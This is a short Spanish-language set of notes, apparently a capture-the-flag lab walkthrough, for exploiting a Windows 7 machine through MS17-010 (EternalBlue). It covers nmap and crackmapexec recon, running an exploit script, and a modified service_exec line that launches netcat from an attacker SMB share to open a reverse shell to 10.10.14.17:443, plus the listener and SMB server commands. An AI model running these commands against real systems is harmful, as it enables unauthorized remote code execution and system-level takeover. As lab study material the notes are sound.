# Summary

- IP -> 10.10.10.40
- Ports -> TCP (135, 139, 445, 49152 - 57), UDP (idk)
- OS ->  
- Services & Applications
    -  -> 
    -  -> 

## Recon
- Comando -> **crackmapexec smb {ip_targeted}** Para listar recursos compartidos de Windows. Enotramos un Windows 7 x64
- Comando -> **nmap --scripts “vuln and safe” -p< PORT> < TARGET IP> -oN < FILENAME>** Lanzara vulnerabilidades que no sean muy intrusivas de tipo seguro, va a mandar scripts al puerto 445 para saber si tiene alguna vulnerabilidad que podamos explotar y encontramos el ms17-010 Ethernal Blue

Descargamos el exploit del Ethernalblue de la siguiente pagina
- **python2 checker.py 10.10.10.40**
	- Si el Checker no nos agarra, revisar que tenga guest en username
Aqui debemos de ver que alguno de los resultados nos ponga OK
- **python2 zzz.exploit.py 10.10.10.40 browser**
Con el zzz dentro del archivo podremos colocar un comando, el cual sera el siguiente:
- service_exec(conn, r'cmd /c  **\\\\10.10.14.17\\SmbFolder\\nc.exe -e cmd 10.10.14.17 443**') 
Haremos que mediante un recurso compartido, ejecute el netcat y nos otorgue una consola interactiva 

Antes debemos de decargarnos el binario para Windows del netcat, en este caso de x64
- **unzip netcat.zip -d netcat** Para que lo descargado se guarde en una carpeta llamada 'netcat'
- **cp netcat/nc64.exe nc.exe** Nos copiamos el netcat de x64 al directorio actual de trabajo pero como netcat 

- **rlwrap nc -nlvp 443** Nos ponemos en escucha 
- **impacket-smbserver smbFolder $(pwd) -smb2support** Creamos nuestro recurso compartido en donde esta el netcat que vamos a compartit y le damos soporte por si las dudas a la version 2 de Windows

Ejecutamos el comando anterior y obtenemos la consola como nt authority/system
